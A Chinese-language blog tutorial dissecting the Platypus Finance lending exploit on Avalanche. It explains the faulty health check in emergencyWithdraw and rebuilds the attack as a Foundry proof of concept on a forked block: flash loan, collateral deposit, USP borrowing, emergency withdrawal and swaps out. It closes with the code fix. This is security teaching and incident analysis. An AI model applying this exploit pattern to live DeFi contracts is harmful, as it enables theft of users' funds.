<!--StartFragment-->


# 一. Platypus 的背景知识

Platypus 是雪崩链的稳定币交易所，众所周知，交易所都有流动性的问题，怎么才能把token的利用率最大化是所有DEX要解决的问题，这个问题不是本篇的重点，这里不做讨论。

Platypus 做了自己的创新，用户向 Platypus 提供流动性，正常要得到 LP Token，这是通用的设计。Platypus 将 LP Token设计成了一个可以抵押兑换新的稳定币 USP的机制。

## 自创稳定币USP

新的稳定币 USP，其他交易所都不会认可。也不是让你拿 USP 出去用的。

拿着USP，你可以去 Platypus金库借贷出通用的稳定币出来，继续用来提供流动性。
这就极大的提高了资金的利用效率。

所以， Platypus 不仅仅是 DEX，还是 Lending。功能越多风险也越大，这次就是借贷的地方少了安全检测，出了bug。


![6lending_plat_1_bg1.png](https://img.learnblockchain.cn/attachments/2023/12/FmEHUj2y656ddb39de1ff.png)


![6lending_plat_2_bg2.png](https://img.learnblockchain.cn/attachments/2023/12/qqdXc9EB656ddb613c97a.png)



![6lending_plat_3_bg3.png](https://img.learnblockchain.cn/attachments/2023/12/DXPhWY18656e8238b8213.png)


# 二. 攻击原理

**攻击在Platypus的借贷功能里**

## 存款是正常的逻辑：

![6lending_plat_4_flow1.png](https://img.learnblockchain.cn/attachments/2023/12/V1l3IUdl656ddde6954a1.png)

## 借款是正常的逻辑：
![6lending_plat_5_flow2.png](https://img.learnblockchain.cn/attachments/2023/12/QyGFVcBu656dddef0a914.png)

## 取款是正常的逻辑：
![6lending_plat_6_flow3.png](https://img.learnblockchain.cn/attachments/2023/12/fqWBveNd656dddf5eeebd.png)

## 紧急取款检查 healthFactor 有bug：
![6lending_plat_7_flowerror.png](https://img.learnblockchain.cn/attachments/2023/12/8kZw8wpA656dddfc5da0d.png)

## `emergencyWithdraw`-有bug的代码：

![6lending_plat_8_codeerror.png](https://img.learnblockchain.cn/attachments/2023/12/RSEv5cSE656ddf3b92c01.png)


# 三.合约的分工
- Pool：`depost`（提供流动性），`swap`（交易稳定币），`withdraw`（移除流动性）。
- MasterPlatypusV4：`depost`（抵押LPToken），`withdraw`（解除抵押）。
- PlatypusTreasure：`borrow`（借出USP），`repay`（偿还USP），`positionView`（用户抵押持仓信息）`isSolvent`（**判断账户是否资不抵债**），`startAuction`（清算）。





<!--StartFragment-->

# 四. POC

## 准备工作

### 最佳学习资料：[DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs)

[SunWeb3Sec: 3. 自己动手写POC1 (Price Oracle Manipulation)](https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/03\_write_your_own_poc)\
[SunWeb3Sec: 4. 自己动手写POC2 - MEV Bot](https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/04\_write_your_own_poc/)\
[SunWeb3Sec: 6. 自己动手写POC3 (Reentrancy)](https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/06\_write_your_own_poc/)

工程里有大量POC代码，非常推荐！！！

### PhaIcon 的使用心得
`PhaIcon`功能很强大。我只说几个我认为重要的点：
1. 梳理攻击步骤时，关闭static静态调用，这些static都是查询balance，ID，address，很重要，但是梳理攻击流程时没有，先关闭，缩小trace行数。

![image.png](https://img.learnblockchain.cn/attachments/2023/12/k3TAJ0Lr656ec15408528.png)

2. 写POC的参数时，尤其是amount，要开启static。
   下图，第一行查询出来的`44,000,000`就是后面两行的入参。
   ![6lending_plat_11phaIcon1.png](https://img.learnblockchain.cn/attachments/2023/12/SGFtgrQH656ec2c6087cd.png)

3. static查询能确定60%的数字来源，剩下的40%需要仔细看业务逻辑的返回值。


![6lending_plat_12phaIcon2.png](https://img.learnblockchain.cn/attachments/2023/12/Lbjeo8ia656ec43cf0043.png)
### 攻击步骤概要
- step1：从 aaveV3，闪电贷 44,000,000个USDC
- step2：向 `platypusPool` 提供流动性， 44,000,000个USDC，得到LP Token
- step3：将LP Token存入 `masterPlatypusV4` 作为抵押物
- step4：向 `platypusTreasure` 借款USP，`platypusTreasure` 会检查 step3 用户的抵押金额。
- **step5：向 `masterPlatypusV4`紧急取款 LP Token**（漏洞在此）
- step6：向 `platypusPool` 取款 USDC
- step7：将白嫖的USP，swap成外面通用的稳定币。


### POC的基本信息
- 这一步就是攻击的基本信息

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo - 
// Attacker : https://avascan.info/blockchain/c/address/0xeff003d64046a6f521ba31f39405cb720e953958
// Attack Contract : https://avascan.info/blockchain/c/address/0x67afdd6489d40a01dae65f709367e1b1d18a5322
// Vulnerable Contract : https://avascan.info/blockchain/c/address/0xbcd6796177ab8071f6a9ba2c3e2e0301ee91bef5
// Attack Tx : https://avascan.info/blockchain/c/tx/0x1266a937c2ccd970e5d7929021eed3ec593a95c68a99b4920c2efa226679b430

// @Info
// Vulnerable Contract Code : https://avascan.info/blockchain/c/address/0xbcd6796177ab8071f6a9ba2c3e2e0301ee91bef5/contract

// @Analysis
// Twitter Guy :https://twitter.com/peckshield/status/1626367531480125440
// https://explorer.phalcon.xyz/tx/avax/0x1266a937c2ccd970e5d7929021eed3ec593a95c68a99b4920c2efa226679b430
contract ContractTest is Test{

}
```


- 看着代码很多，其实都是要调用的接口信息，具体从phalcon取，调了什么取什么。
  https://explorer.phalcon.xyz/tx/avax/0x1266a937c2ccd970e5d7929021eed3ec593a95c68a99b4920c2efa226679b430?line=814

```solidity
interface AaveV3Pool {
    function flashLoanSimple(address receiverAddress, address asset, uint amount, bytes memory params, uint16 referralCode) external;
}
interface PlatypusPool {
    function deposit(address token, uint amount, address to, uint deadline) external returns (uint);
    function swap(address fromToken, address toToken, uint fromAmount, uint minnumAmount, address to, uint deadline) external returns (uint, uint);
    function withdraw(address token, uint liquidity, uint minimumAmount, address to, uint deadline) external returns (uint);
    function getTokenAddresses() external view returns (address[] memory);
    function assetOf(address token) external view returns (address);//key-value: USDC->LP_USDC
}
interface IUSP is IERC20{
    function approve(address spender, uint256 amount) external returns (bool);
}
interface ILP_USDC is IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}
interface MasterPlatypusV4{
    function deposit(uint _pid, uint _amount) external returns(uint256, uint256[] memory);
    function emergencyWithdraw(uint pid) external;
}
interface PlatypusTreasure{
    function borrow(address token, uint borrowAmount) external;
    function isSolvent(
        address _user,
        address _token,
        bool _open
    ) external view returns (bool solvent, uint256 debtAmount) ;
    function positionView(address _user, address _token) external view returns (PositionView memory);
    /// @notice A struct to preview a user's collateral position; external view-only
    struct PositionView {
        uint256 collateralAmount;
        uint256 collateralUSD;
        uint256 borrowLimitUSP;
        uint256 liquidateLimitUSP;
        uint256 debtAmountUSP;
        uint256 debtShare;
        uint256 healthFactor; // `healthFactor` is 0 if `debtAmountUSP` is 0
        bool liquidable;
    }
}
```
- 这里就用的Token和接口实例

```solidity
contract ContractTest is Test{
    AaveV3Pool aaveV3Pool = AaveV3Pool(0x794a61358D6845594F94dc1DB02A252b5b4814aD);

    IERC20 USDC = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
    IERC20 USDC_e = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);
    IERC20 USDT = IERC20(0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7);
    IERC20 USDT_e = IERC20(0xc7198437980c041c805A1EDcbA50c1Ce5db95118);
    IERC20 BUSD = IERC20(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
    IERC20 DAI_e = IERC20(0xd586E7F844cEa2F87f50152665BCbc2C279D8d70);
    ILP_USDC LP_USDC = ILP_USDC(0xAEf735B1E7EcfAf8209ea46610585817Dc0a2E16);
    IUSP USP = IUSP(0xdaCDe03d7Ab4D81fEDdc3a20fAA89aBAc9072CE2);

    PlatypusPool platypusPool = PlatypusPool(0x66357dCaCe80431aee0A7507e2E361B7e2402370);

    MasterPlatypusV4 masterPlatypusV4 = MasterPlatypusV4(0xfF6934aAC9C94E1C39358D4fDCF70aeca77D0AB0);
    PlatypusTreasure platypusTreasure = PlatypusTreasure(0x061da45081ACE6ce1622b9787b68aa7033621438);//这里应该是proxy的地址


    function setUp() public {
        vm.createSelectFork('Avalanche', 26343614 - 1);
    }
}
```

## 开始开始POC逻辑

### - step1：从 aaveV3，闪电贷 44,000,000个USDC
```solidity
    function testExploit() public {

        aaveV3Pool.flashLoanSimple(address(this), address(USDC), 44_000_000e6,  abi.encode(""), 0);

    }
```
### - step2：向 `platypusPool` 提供流动性， 44,000,000个USDC，得到LP Token
```solidity
    function executeOperation(address asset, uint amount, uint premium, address initiator, bytes memory params) external returns (bool){
        console.log("executeOperation");
        console.logBytes(params);

        //step2
        USDC.approve(address(aaveV3Pool),   amount + premium);//44,022,000e6变成44_022_000e6
        USDC.approve(address(platypusPool), amount);
        platypusPool.deposit(address(USDC), amount, address(this), block.timestamp+1000);//
        return true；
 }
```
### - step3：将LP Token存入 `masterPlatypusV4` 作为抵押物
```solidity
    function executeOperation(address asset, uint amount, uint premium, address initiator, bytes memory params) external returns (bool){
        console.log("executeOperation");
        console.logBytes(params);

        //step2
        ...
         //step3
        uint256 LP_USDC_myBalance = LP_USDC.balanceOf(address(this));
        LP_USDC.approve(address(masterPlatypusV4), LP_USDC_myBalance);
        masterPlatypusV4.deposit(4, LP_USDC_myBalance);
        
        return true;
 }
```
### - step4：向 `platypusTreasure` 借款USP，`platypusTreasure` 会检查 step3 用户的抵押金额。
```solidity
    function executeOperation(address asset, uint amount, uint premium, address initiator, bytes memory params) external returns (bool){
        console.log("executeOperation");
        console.logBytes(params);

        //step2
        ...
       //step3
      ...
       //step4
        PlatypusTreasure.PositionView memory positionView = platypusTreasure.positionView(address(this), address(LP_USDC));
        uint256 borrowLimitUSP = positionView.borrowLimitUSP;
        platypusTreasure.borrow(address(LP_USDC), borrowLimitUSP);
        
        return true;
 }
```
### - **step5：向 `masterPlatypusV4的emergencyWithdraw`紧急取款 LP Token**（漏洞在此）
```solidity
    function executeOperation(address asset, uint amount, uint premium, address initiator, bytes memory params) external returns (bool){
        console.log("executeOperation");
        console.logBytes(params);

        //step2
        ...
       //step3
      ...
       //step4
      ...
       //step5
        logPositionHealthCheck(address(LP_USDC));
        masterPlatypusV4.emergencyWithdraw(4);//取LP.  抵押LP借的USP还未换，就取款。
        logPositionHealthCheck(address(LP_USDC));

              
        return true;
 }
```
### - step6：向 `platypusPool` 取款 USDC
```solidity
    function executeOperation(address asset, uint amount, uint premium, address initiator, bytes memory params) external returns (bool){
        console.log("executeOperation");
        console.logBytes(params);

        //step2
        ...
       //step3
      ...
       //step4
      ...
       //step5
        ...
        //step6
        LP_USDC_myBalance = LP_USDC.balanceOf(address(this));
        LP_USDC.approve(address(platypusPool), LP_USDC_myBalance);
        platypusPool.withdraw(address(USDC), LP_USDC_myBalance, 0, address(this), block.timestamp+1000);
        
        return true;
 }
```
### - step7：将白嫖的USP，swap成外面通用的稳定币。
这里没有兑换完所有的USP，攻击者手里还剩下很多。
```solidity
    function executeOperation(address asset, uint amount, uint premium, address initiator, bytes memory params) external returns (bool){
        console.log("executeOperation");
        console.logBytes(params);

        //step2
        ...
       //step3
      ...
       //step4
      ...
       //step5
        ...
        //step6
        ...
       //step7
        USP.approve(address(platypusPool), 9_000_000e18);
        platypusPool.swap(address(USP), address(USDC), 2_500_000e18, 0, address(this), block.timestamp+1000);
        platypusPool.swap(address(USP), address(USDC_e), 2_000_000e18, 0, address(this), block.timestamp+1000);
        platypusPool.swap(address(USP), address(USDT), 1_600_000e18, 0, address(this), block.timestamp+1000);
        platypusPool.swap(address(USP), address(USDT_e), 1_250_000e18, 0, address(this), block.timestamp+1000);
        platypusPool.swap(address(USP), address(BUSD), 700_000e18, 0, address(this), block.timestamp+1000);
        platypusPool.swap(address(USP), address(DAI_e), 700_000e18, 0, address(this), block.timestamp+1000);
        
        return true;
 }
```

# 五.更多思考

## 关于swap的数量问题，每种稳定币交易多少是怎么定的？

攻击者得到了42,044,533个USP，这个量其实已经超过了pool的稳定币现有容量。
所以，只拿出1/5，即9,000,000个USP，还剩下33,044,533个USP没有变现。


![6lending_plat_9morethink_table.png](https://img.learnblockchain.cn/attachments/2023/12/0dU0xSRW656eab8ce8724.png)
看上图，swap把每种稳定币都拿走了接近2/3左右。

我猜测，攻击者是希望Platypus还能继续正常运营，如果一下掏空了，可能项目方就放弃了，毕竟手里还有大量USP等待兑换。

## 代码怎么改，才能补上漏洞

很简单，代码调整下顺序，检查放在`transfer`之后，如果转给用户前后，跌破了健康阈值，就revert 回滚代码，攻击就不会发生了。

![6lending_plat_10morethink_goodcode.png](https://img.learnblockchain.cn/attachments/2023/12/rPjdjiqd656ebe2364a8d.png)





<!--EndFragment-->